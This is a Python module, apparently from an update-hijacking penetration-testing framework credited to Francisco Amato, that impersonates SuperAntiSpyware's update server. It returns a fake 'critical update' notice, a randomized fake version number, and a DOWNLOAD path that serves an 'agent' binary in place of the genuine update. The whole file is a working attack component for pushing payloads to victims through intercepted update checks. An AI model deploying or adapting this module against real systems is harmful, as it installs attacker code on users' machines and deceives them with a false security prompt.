from modules import ModuleBase


class SuperantiSpyware(ModuleBase):
    name = 'Superantispyware'
    version = '1.0'
    appver = ''
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(www.superantispyware.com)' 
    options = {
        'description': {
            'val': 'This critical update fix internal vulnerability',
            'desc': 'Description to be displayed during the update'
        },
        'version': {
            'val': "7.2.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': 'STATUS',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': 'OK',
            'parse': 1,
            'file': '',
        }, {
            'path': 'GETAVAILABLE',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/superantispyware/superantispyware.xml',
        }, {
            'path': 'DOWNLOAD',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]